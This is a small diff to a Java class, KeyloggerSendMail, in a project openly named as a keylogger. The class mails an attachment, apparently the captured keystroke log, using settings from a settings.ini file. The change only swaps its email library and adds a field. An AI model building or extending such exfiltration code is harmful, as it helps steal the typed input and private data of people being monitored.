@@ -6,7 +6,7 @@
 package com.github.juliansantosinfo.jaskeylogger;
 
 import java.io.File;
-import com.github.juliansantosinfo.email.Email;
+import com.github.juliansantosinfo.jassimpleemail.JASSimpleEmail;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import org.apache.commons.mail.EmailException;
@@ -15,9 +15,10 @@ import org.apache.commons.mail.EmailException;
  *
  * @author Julian Santos
  */
-public class KeyloggerSendMail extends Email implements Runnable {
+public class KeyloggerSendMail extends JASSimpleEmail implements Runnable {
 
     private final File attachment;
+    private final JASSimpleEmail simpleEmail = new JASSimpleEmail();
 
     public KeyloggerSendMail(File attachment) {
         this.attachment = attachment;
@@ -43,7 +44,7 @@ public class KeyloggerSendMail extends Email implements Runnable {
             System.out.println(this.getClass().getName() + "|" + "Failed to load file (settings.ini)!");
             return;
         }
-
+        
         try {
             // Send email.
             if (sendMailWithAttachments(attachment)) {
